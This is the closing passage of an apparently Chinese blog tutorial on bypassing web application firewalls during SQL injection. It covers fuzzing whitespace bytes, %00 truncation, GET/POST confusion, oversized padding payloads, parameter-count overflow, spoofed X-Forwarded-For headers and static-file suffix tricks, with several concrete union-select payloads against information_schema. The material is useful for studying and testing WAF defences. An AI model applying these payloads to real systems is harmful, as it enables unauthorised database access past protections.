 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>空白字符：</p></li></ul> 
 <p style="text-indent:1.4em;">[0x00,0x09，0x0a-0x0d,0x20]</p> 
 <h4 style="">4.配合 FUZZ</h4> 
 <p style="text-indent:1.4em;">select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】from【位置五】admin</p> 
 <h3 style=""><span class="kdocs-color" style="background-color:#FBF5B3;"><span class="kdocs-bold" style="font-weight:bold;">&lt;逻辑层&gt;</span></span></h3> 
 <h4 style="">1.逻辑问题</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>云 waf 防护，一般我们会尝试通过查找站点的真实 IP，从而绕过 CDN 防护。</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。 </p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>HTTP 和 HTTPS 同时开放服务，没有做 HTTP 到 HTTPS 的强制跳转，导致 HTTPS 有 WAF 防护，HTTP没有防护，直接访问 HTTP 站点绕过防护。</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>特殊符号%00，部分 waf 遇到%00 截断，只能获取到前面的参数，无法获取到后面的有害参数输 入 ， 从 而 导 致 Bypass 。 比 如 ： id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</p></li></ul> 
 <h4 style="">2.性能问题</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>猜想 1：在设计 WAF 系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p></li></ul> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>猜想 2：不少 WAF 是 C 语言写的，而 C 语言自身没有缓冲区保护机制，因此如果 WAF 在处理测试向量时超出了其缓冲区长度就会引发 bug，从而实现绕过。</p></li></ul> 
 <pre class="kdocs-bash"><code class="language-bash">例子1：
?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9
PS：0xA*1000 指 0xA 后面“A”重复 1000 次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里 1000只做参考也许在有些情况下可能不需要这么长也能溢出。

例子2：
?a0=0&amp;a1=1&amp;.....&amp;a100=100&amp;id=1 union select 1,schema_name,3 from INFORMATION_SCHEMA.schemata
备注：获取请求参数，只获取前 100 个参数，第 101 个参数并没有获取到，导致 SQL 注入绕过。</code></pre> 
 <h4 style="">3.白名单</h4> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>方式一：IP 白名单</p></li></ul> 
 <p style="text-indent:1.4em;">从网络层获取的 ip，这种一般伪造不来，如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情</p> 
 <p style="">况。</p> 
 <pre class="kdocs-bash"><code class="language-bash">测试方法：修改 http 的 header 来 bypass waf
X-forwarded-for
X-remote-IP
X-originating-IP
X-remote-addr
X-Real-ip</code></pre> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>方式二：静态资源</p></li></ul> 
 <p style="text-indent:1.4em;">特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。</p> 
 <pre class="kdocs-bash"><code class="language-bash">http://10.9.9.201/sql.php?id=1
http://10.9.9.201/sql.php/1.js?id=1
备注：Aspx/php 只识别到前面的.aspx/.php 后面基本不识别</code></pre> 
 <ul><li style="margin-left:1.4em;list-style-type:disc;text-indent:0;"><p>方式三：url 白名单</p></li></ul> 
 <p style="">为了防止误拦，部分 waf 内置默认的白名单列表，如 admin/manager/system 等管理后台。只要 url</p> 
 <p style="">中存在白名单的字符串，就作为白名单不进行检测。</p> 
 <p style=""></p> 
</div>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0ba7ccef5812ef5ed1a83b922cf39048/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">CRNN模型Python实现笔记一</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a873891e3bfc3e37d0d8a50b238badff/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【选择结构】奇偶数判断</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>